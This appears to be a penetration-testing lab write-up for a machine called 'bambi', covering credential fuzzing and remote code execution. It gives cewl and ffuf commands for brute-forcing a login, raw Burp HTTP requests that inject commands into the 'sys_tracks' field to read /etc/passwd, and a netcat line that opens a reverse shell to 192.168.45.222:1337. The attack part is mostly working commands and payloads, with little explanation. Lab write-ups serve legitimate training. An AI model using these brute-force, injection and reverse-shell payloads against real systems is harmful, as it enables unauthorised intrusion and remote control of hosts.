
#### 1. Credential Fuzzing (BAMBI)
- With usernames found on the machine `Sam, Devon, Johnny` utilized `cewl` to generate a password list against the website due to the website being strictly focused on a specific music hobby.
- Utilized `cewl` command below to create a custom password list with words taken off the `http://bambi` website
```bash
cewl --write passwords.txt http://bambi
```
once `passwords.txt` was created utilized `ffuf` with valid usernames to identify `login` credentials

```bash
ffuf -w passwords.txt -u http://bambi/dev/index.php -X POST -d 'username=Sam&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' 
```
-------
#### 2. LCE & RCE (BAMBI)
original payload for testing `LCE`
```http
POST /dev/admin.php HTTP/1.1

Host: bambi
Content-Length: 63
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://bambi
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bambi/dev/admin.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=a3b6945256d08ae6372daaaca7b8c375
Connection: keep-alive

sys_info=-h&sys_tracks=%2Fvar%2Ftmp%2Ftracks%2F;cat+/etc/passwd
```
original payload for testing `RCE`:
```bash
curl http://192.168.45.222:80/bambi/
```
creating payload to get a reverse shell:
```bash
/bin/nc 192.168.45.222 1337 -e /bin/bash
```
full burpsuite payload with url encoding `CTRL+U`
```http
POST /dev/admin.php HTTP/1.1
Host: bambi
Content-Length: 88
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://bambi
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bambi/dev/admin.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=a3b6945256d08ae6372daaaca7b8c375
Connection: keep-alive

sys_info=-h&sys_tracks=%2Fvar%2Ftmp%2Ftracks%2F;/bin/nc+192.168.45.222+1337+-e+/bin/bash
```



